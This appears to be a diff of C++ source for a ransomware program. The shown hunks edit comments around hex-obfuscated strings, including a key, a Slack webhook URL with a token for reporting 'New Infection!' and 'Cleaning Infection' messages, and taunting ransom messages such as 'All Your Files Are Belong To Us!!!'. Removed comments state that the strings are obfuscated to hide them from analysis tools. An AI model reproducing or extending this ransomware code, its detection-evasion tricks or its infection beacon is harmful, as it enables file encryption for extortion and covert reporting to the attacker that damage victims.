@@ -48,6 +48,7 @@ bool g_Decrypt = false;
 // Encoded String Declarations
 //
 // Use StringToHexGenerator.exe to generate the Hex version of a string you want to obfuscate
+// Deobfuscation is handled by the DecodeStrings() function
 //
 std::string strKey = "9764742653472355868674465764752686e46595a7e485169764742644e4851697862315"; // Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy
 std::string strAppData = "16471644070714"; // AppData
@@ -88,7 +89,6 @@ std::string strSlackHost = "d6f636e2b63616c637e237b6f6f686"; // hooks.slack.com
 std::string strHttpPost = "4535f405"; // POST
 std::string strSlackUrl = "6705936676a754a45734657566f42793b483053794a5b615f27535e453e454d4a424f29573a505b453a4a445f23756369667275637f2"; // "/services/TJJ5KPZ7Y/BJMEN5NSW/QkZIsP8K9rOfWVCuJEzgf9Pv"
 std::string strHttpHeaderJson = "e6c527c5e6f637a6f2e6f69647163696c607071602a356079747d247e65647e6f634"; // "Content-type: application/json\r\n"
-//std::string strSlackPostMsg = ""; // "{ \"text\":\"New Infection!"  // not using at this time
 std::string strSlackNewInfection = "12e6f69647365666e694027756e422a322478756472202b7"; // "{ \"text\":\"New Infection!"
 std::string strSlackCleanInfection = "e6f602e6f69647365666e6940276e696e61656c63422a322478756472202b7"; // "{ \"text\":\"Cleaning Infection on";
 std::string strSlackComputer = "02a32756475707d6f63402"; // " Computer: "
@@ -187,8 +187,6 @@ int main(int argc, char* argv[])
 			else
 			{ 
 				// There was no key provided with the /d option.
-
-				// Obfuscating the string "You must provide a password with the /d option to continue." from analysis tools
 				// "You must provide a password with the /d option to continue." 
 				std::cout << strPasswordNeeded << std::endl;
 
@@ -243,9 +241,7 @@ int main(int argc, char* argv[])
 		//
 
 		// Finds .encrypted files, and decrypts them
-
-		// Obfuscating the string "You entered the password: " from analysis tools
-		// "You entered the password: " << keyDecrypt 
+		// "You entered the password: " << keyDecrypt
 		std::cout << strPwdMessage << keyDecrypt << std::endl; 
 
 		PrintProgress();
@@ -258,8 +254,7 @@ int main(int argc, char* argv[])
 		dwDecryptionResult = FindEncryptedFiles(keyDecrypt);
 		if (dwDecryptionResult > 0)
 		{
-			// Obfuscating the string "] files failed to recover.  Rerun the program with your password." from analysis tools
-			// "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << "] files failed to recover.  Rerun the program with your password."
+			// "0x<# of files in hex>[<# of files in base10>] files failed to recover.  Rerun the program with your password."
 			std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << strRecoveryFailed << std::endl;
 		}
 	}
@@ -268,7 +263,6 @@ int main(int argc, char* argv[])
 	// End with a fun message
 	if (!g_Decrypt)
 	{
-		// Obfuscating the string "All Your Files Are Belong To Us!!! :\\" from analysis tools
 		// "All Your Files Are Belong To Us!!! :\\" 
 		std::cout << std::endl << strAllYourFilesAreBelongToUs << std::endl;
 	}
@@ -276,7 +270,6 @@ int main(int argc, char* argv[])
 	{
 		if (dwDecryptionResult > 0)
 		{
-			// Obfuscating the string "Not All Your Files Are Belong To You!!! :<" from analysis tools
 			// "Not All Your Files Are Belong To You!!! :<" 
 			std::cout << std::endl << strNotAllYourFilesAreBelongToYou << std::endl;
 
@@ -288,7 +281,6 @@ int main(int argc, char* argv[])
 		}
 		else
 		{
-			// Obfuscating the string "All Your Files Are Belong To You!!! :>" from analysis tools
 			// "All Your Files Are Belong To You!!! :>" 
 			std::cout << std::endl << strAllYourFilesAreBelongToYou << std::endl;
 
